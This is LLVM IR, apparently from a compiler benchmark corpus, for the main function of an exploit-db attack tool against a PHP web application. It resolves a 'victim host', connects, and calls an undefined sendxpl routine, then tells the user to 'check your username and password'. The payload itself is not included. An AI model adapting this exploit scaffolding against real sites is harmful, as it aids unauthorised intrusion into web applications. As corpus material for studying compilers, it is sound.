; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/php/webapps/extr_801.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/php/webapps/extr_801.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.sockaddr_in = type { i32, i32, i32 }
%struct.hostent = type { i32, i32 }
%struct.sockaddr = type { i32 }

@AF_INET = common dso_local global i32 0, align 4
@SOCK_STREAM = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [6 x i8] c"clear\00", align 1
@.str.1 = private unnamed_addr constant [27 x i8] c"[*] Creating socket\09\09[OK]\0A\00", align 1
@.str.2 = private unnamed_addr constant [32 x i8] c"[*] Resolving victim host\09[OK]\0A\00", align 1
@PORT = common dso_local global i32 0, align 4
@.str.3 = private unnamed_addr constant [38 x i8] c"[*] Connecting at victim host   [OK]\0A\00", align 1
@.str.4 = private unnamed_addr constant [2 x i8] c"a\00", align 1
@.str.5 = private unnamed_addr constant [62 x i8] c"[*] Now check your username and password\0A    on http://%s%s\0A\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca %struct.sockaddr_in, align 4
  %10 = alloca %struct.hostent*, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %11 = load i32, i32* %4, align 4
  %12 = icmp ne i32 %11, 5
  br i1 %12, label %13, label %15

13:                                               ; preds = %2
  %14 = call i32 (...) @info()
  br label %15

15:                                               ; preds = %13, %2
  %16 = load i32, i32* @AF_INET, align 4
  %17 = load i32, i32* @SOCK_STREAM, align 4
  %18 = call i32 @socket(i32 %16, i32 %17, i32 0)
  store i32 %18, i32* %7, align 4
  %19 = icmp slt i32 %18, 0
  br i1 %19, label %20, label %22

20:                                               ; preds = %15
  %21 = call i32 (...) @errsock()
  br label %22

22:                                               ; preds = %20, %15
  %23 = call i32 @system(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str, i64 0, i64 0))
  %24 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.1, i64 0, i64 0))
  %25 = load i8**, i8*** %5, align 8
  %26 = getelementptr inbounds i8*, i8** %25, i64 1
  %27 = load i8*, i8** %26, align 8
  %28 = call %struct.hostent* @gethostbyname(i8* %27)
  store %struct.hostent* %28, %struct.hostent** %10, align 8
  %29 = icmp eq %struct.hostent* %28, null
  br i1 %29, label %30, label %32

30:                                               ; preds = %22
  %31 = call i32 (...) @errgeth()
  br label %32

32:                                               ; preds = %30, %22
  %33 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.2, i64 0, i64 0))
  %34 = call i32 @memset(%struct.sockaddr_in* %9, i32 0, i32 12)
  %35 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 2
  %36 = bitcast i32* %35 to i8*
  %37 = load %struct.hostent*, %struct.hostent** %10, align 8
  %38 = getelementptr inbounds %struct.hostent, %struct.hostent* %37, i32 0, i32 1
  %39 = load i32, i32* %38, align 4
  %40 = load %struct.hostent*, %struct.hostent** %10, align 8
  %41 = getelementptr inbounds %struct.hostent, %struct.hostent* %40, i32 0, i32 0
  %42 = load i32, i32* %41, align 4
  %43 = call i32 @memcpy(i8* %36, i32 %39, i32 %42)
  %44 = load i32, i32* @AF_INET, align 4
  %45 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 1
  store i32 %44, i32* %45, align 4
  %46 = load i32, i32* @PORT, align 4
  %47 = call i32 @htons(i32 %46)
  %48 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 0
  store i32 %47, i32* %48, align 4
  %49 = load i32, i32* %7, align 4
  %50 = bitcast %struct.sockaddr_in* %9 to %struct.sockaddr*
  %51 = call i32 @connect(i32 %49, %struct.sockaddr* %50, i32 12)
  store i32 %51, i32* %8, align 4
  %52 = load i32, i32* %8, align 4
  %53 = icmp slt i32 %52, 0
  br i1 %53, label %54, label %57

54:                                               ; preds = %32
  %55 = load i8**, i8*** %5, align 8
  %56 = call i32 @errconn(i8** %55)
  br label %57

57:                                               ; preds = %54, %32
  %58 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([38 x i8], [38 x i8]* @.str.3, i64 0, i64 0))
  %59 = load i32, i32* %7, align 4
  %60 = call i32* @fdopen(i32 %59, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.4, i64 0, i64 0))
  store i32* %60, i32** %6, align 8
  %61 = load i32*, i32** %6, align 8
  %62 = call i32 @setbuf(i32* %61, i32* null)
  %63 = load i32*, i32** %6, align 8
  %64 = load i8**, i8*** %5, align 8
  %65 = call i32 @sendxpl(i32* %63, i8** %64)
  %66 = load i8**, i8*** %5, align 8
  %67 = getelementptr inbounds i8*, i8** %66, i64 1
  %68 = load i8*, i8** %67, align 8
  %69 = load i8**, i8*** %5, align 8
  %70 = getelementptr inbounds i8*, i8** %69, i64 2
  %71 = load i8*, i8** %70, align 8
  %72 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([62 x i8], [62 x i8]* @.str.5, i64 0, i64 0), i8* %68, i8* %71)
  %73 = load i32, i32* %8, align 4
  %74 = call i32 @shutdown(i32 %73, i32 2)
  %75 = load i32, i32* %8, align 4
  %76 = call i32 @close(i32 %75)
  ret i32 0
}

declare dso_local i32 @info(...) #1

declare dso_local i32 @socket(i32, i32, i32) #1

declare dso_local i32 @errsock(...) #1

declare dso_local i32 @system(i8*) #1

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local %struct.hostent* @gethostbyname(i8*) #1

declare dso_local i32 @errgeth(...) #1

declare dso_local i32 @memset(%struct.sockaddr_in*, i32, i32) #1

declare dso_local i32 @memcpy(i8*, i32, i32) #1

declare dso_local i32 @htons(i32) #1

declare dso_local i32 @connect(i32, %struct.sockaddr*, i32) #1

declare dso_local i32 @errconn(i8**) #1

declare dso_local i32* @fdopen(i32, i8*) #1

declare dso_local i32 @setbuf(i32*, i32*) #1

declare dso_local i32 @sendxpl(i32*, i8**) #1

declare dso_local i32 @shutdown(i32, i32) #1

declare dso_local i32 @close(i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
